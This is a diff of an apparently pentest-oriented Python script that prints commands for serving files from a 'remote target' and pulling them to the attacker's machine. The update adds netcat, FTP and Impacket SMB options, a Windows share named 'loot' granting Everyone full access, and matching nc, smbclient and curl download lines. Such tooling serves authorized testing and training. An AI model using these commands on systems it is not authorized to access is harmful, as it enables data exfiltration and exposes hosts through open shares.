@@ -83,66 +83,64 @@ def section(title: str):
 
 # ── Command generators ────────────────────────────────────────────────────────
 
-def remote_serve_commands(remote_os: str, port: int, directory: str) -> list[tuple[str, str]]:
+def remote_serve_commands(remote_os: str, port: int, directory: str) -> list[tuple[str, str, str]]:
     """
-    Returns a list of (label, command) pairs for starting an HTTP server
-    on the remote machine. directory is the folder containing the file.
+    Returns a list of (label, command, protocol) triples for starting a server
+    on the remote machine.
     """
     cmds = []
     dir_arg = directory if directory else "."
 
     if remote_os == "linux":
         cmds += [
-            ("python3 (built-in)",
-             f"cd {dir_arg} && python3 -m http.server {port}"),
-            ("python2 (built-in)",
-             f"cd {dir_arg} && python2 -m SimpleHTTPServer {port}"),
-            ("busybox (minimal Linux)",
-             f"cd {dir_arg} && busybox httpd -f -p {port}"),
-            ("php (if installed)",
-             f"cd {dir_arg} && php -S 0.0.0.0:{port}"),
-            ("ruby (if installed)",
-             f"cd {dir_arg} && ruby -run -e httpd . -p {port}"),
+            ("Python3 HTTP (built-in)", f"cd {dir_arg} && python3 -m http.server {port}", "http"),
+            ("Python2 HTTP (built-in)", f"cd {dir_arg} && python2 -m SimpleHTTPServer {port}", "http"),
+            ("PHP HTTP (if installed)", f"cd {dir_arg} && php -S 0.0.0.0:{port}", "http"),
+            ("Ruby HTTP (if installed)", f"cd {dir_arg} && ruby -run -e httpd . -p {port}", "http"),
+            ("Busybox HTTP (if installed)", f"cd {dir_arg} && busybox httpd -f -p {port}", "http"),
+            ("Netcat (Raw TCP - Fast!)", f"cd {dir_arg} && nc -lp {port} < \"$FILE\"", "nc"),
+            ("Python3 FTP (requires pyftpdlib)", f"python3 -m pyftpdlib -p {port} -d {dir_arg}", "ftp"),
+            ("Impacket SMB (requires impacket)", f"impacket-smbserver -smb2support loot {dir_arg}", "smb"),
         ]
     elif remote_os == "windows":
         cmds += [
-            ("Python3 (if installed)",
-             f"cd /d {dir_arg} && python -m http.server {port}"),
-            ("PowerShell (native, No-Admin)",
-             f"$l=[Net.Sockets.TcpListener]{port};$l.Start();while($true){{$c=$l.AcceptTcpClient();$s=$c.GetStream();$b=New-Object byte[] 1024;$n=$s.Read($b,0,1024);$req=[Text.Encoding]::ASCII.GetString($b,0,$n);$f=Join-Path '{dir_arg}' ($req.Split(' ')[1].TrimStart('/'));if(Test-Path $f){{$data=[IO.File]::ReadAllBytes($f);$h=\"HTTP/1.1 200 OK`r`nContent-Length: $($data.Length)`r`n`r`n\";$hb=[Text.Encoding]::ASCII.GetBytes($h);$s.Write($hb,0,$hb.Length);$s.Write($data,0,$data.Length)}};$c.Close()}}"),
-
-            ("PowerShell (native, Requires Admin)",
-             f"cd {dir_arg}; "
-             f"$H=new-object Net.HttpListener; $H.Prefixes.Add('http://+:{port}/'); $H.Start(); "
-             f"while($H.IsListening){{$ctx=$H.GetContext(); "
-             f"$f=Join-Path (Get-Location) $ctx.Request.Url.LocalPath.TrimStart('/'); "
-             f"if(Test-Path $f){{$b=[IO.File]::ReadAllBytes($f); "
-             f"$ctx.Response.OutputStream.Write($b,0,$b.Length)}}; "
-             f"$ctx.Response.Close()}}"),
-            ("php (if installed)",
-             f"cd /d {dir_arg} && php -S 0.0.0.0:{port}"),
+            ("Python3 HTTP (built-in)", f"cd /d {dir_arg} && python -m http.server {port}", "http"),
+            ("PHP HTTP (if installed)", f"cd /d {dir_arg} && php -S 0.0.0.0:{port}", "http"),
+            ("PowerShell HTTP (No-Admin)",
+             f"$l=[Net.Sockets.TcpListener]{port};$l.Start();while($true){{$c=$l.AcceptTcpClient();$s=$c.GetStream();$b=New-Object byte[] 1024;$n=$s.Read($b,0,1024);$req=[Text.Encoding]::ASCII.GetString($b,0,$n);$f=Join-Path '{dir_arg}' ($req.Split(' ')[1].TrimStart('/'));if(Test-Path $f){{$data=[IO.File]::ReadAllBytes($f);$h=\"HTTP/1.1 200 OK`r`nContent-Length: $($data.Length)`r`n`r`n\";$hb=[Text.Encoding]::ASCII.GetBytes($h);$s.Write($hb,0,$hb.Length);$s.Write($data,0,$data.Length)}};$c.Close()}}", "http"),
+            ("Netcat (Raw TCP - Fast!)", f"nc.exe -lp {port} < \"$FILE\"", "nc"),
+            ("Native SMB Share (Admin)", f"New-SmbShare -Name 'loot' -Path '{dir_arg}' -FullAccess 'Everyone'", "smb"),
         ]
     return cmds
 
 
-def local_download_commands(remote_ip: str, port: int, filename: str) -> list[tuple[str, str]]:
+def local_download_commands(remote_ip: str, port: int, filename: str, proto: str) -> list[tuple[str, str]]:
     """
-    Returns (label, command) pairs for downloading the file locally.
-    Works on the attacker's Linux machine.
+    Returns (label, command) pairs for downloading the file locally based on protocol.
     """
     enc = url_encode(filename)
     url = f"http://{remote_ip}:{port}/{enc}"
-    cmds = [
-        ("wget",
-         f'wget -q --show-progress -O "{filename}" "{url}"'),
-        ("curl",
-         f'curl -fsSL "{url}" -o "{filename}"'),
-        ("curl (verbose / debug)",
-         f'curl -v "{url}" -o "{filename}"'),
-        ("Python3 urllib",
-         f'python3 -c "import urllib.request; urllib.request.urlretrieve(\'{url}\', \'{filename}\')"'),
-    ]
-    return cmds
+    
+    if proto == "http":
+        return [
+            ("wget", f'wget -q --show-progress -O "{filename}" "{url}"'),
+            ("curl", f'curl -fsSL "{url}" -o "{filename}"'),
+        ]
+    elif proto == "nc":
+        return [
+            ("netcat", f"nc {remote_ip} {port} > \"{filename}\""),
+        ]
+    elif proto == "smb":
+        return [
+            ("smbclient", f"smbclient //[{remote_ip}]/loot -c 'get \"{filename}\" \"{filename}\"'"),
+            ("mount", f"sudo mount -t cifs //[{remote_ip}]/loot /mnt -o guest && cp /mnt/\"{filename}\" ."),
+        ]
+    elif proto == "ftp":
+        return [
+            ("wget (ftp)", f"wget --no-passive-ftp ftp://{remote_ip}:{port}/\"{filename}\""),
+            ("curl (ftp)", f"curl -u anonymous:anonymous ftp://{remote_ip}:{port}/\"{filename}\" -o \"{filename}\""),
+        ]
+    return []
 
 
 # ── Main ──────────────────────────────────────────────────────────────────────
@@ -201,17 +199,27 @@ def main():
     section("STEP 1 — Run on the REMOTE machine")
     serve_cmds = remote_serve_commands(remote_os, port, remote_dir)
     print(f"  {DIM}(Pick one based on what is available on the remote target){NC}\n")
-    for label, cmd in serve_cmds:
+    for label, cmd, proto in serve_cmds:
+        # Inject the actual filename into the command if it uses the $FILE placeholder
+        final_cmd = cmd.replace("$FILE", remote_filename)
         print(f"  {BM}▶ {BO}{label}{NC}")
-        print(f"    {BC}{cmd}{NC}\n")
+        print(f"    {BC}{final_cmd}{NC}\n")
 
     # ── Print: Download locally ────────────────────────────────────────────
     section("STEP 2 — Run on YOUR (local) machine")
-    dl_cmds = local_download_commands(remote_ip, port, remote_filename)
-    print(f"  {DIM}(Pick one to download the file to your current folder){NC}\n")
-    for label, cmd in dl_cmds:
-        print(f"  {BM}▶ {BO}{label}{NC}")
-        print(f"    {BC}{cmd}{NC}\n")
+    # Show ALL download options for the protocols offered in Step 1
+    # We'll group them by protocol for clarity
+    seen_protos = set(s[2] for s in serve_cmds)
+    for proto in seen_protos:
+        dl_cmds = local_download_commands(remote_ip, port, remote_filename, proto)
+        if dl_cmds:
+            proto_label = proto.upper() if proto != "nc" else "Netcat"
+            print(f"  {BO}{proto_label} Options:{NC}")
+            for label, cmd in dl_cmds:
+                print(f"    {BM}▶ {label}{NC}")
+                print(f"      {BC}{cmd}{NC}")
+            print()
+
 
     # ── Summary box ────────────────────────────────────────────────────────
     print(f"{BG}{'━' * 58}{NC}")
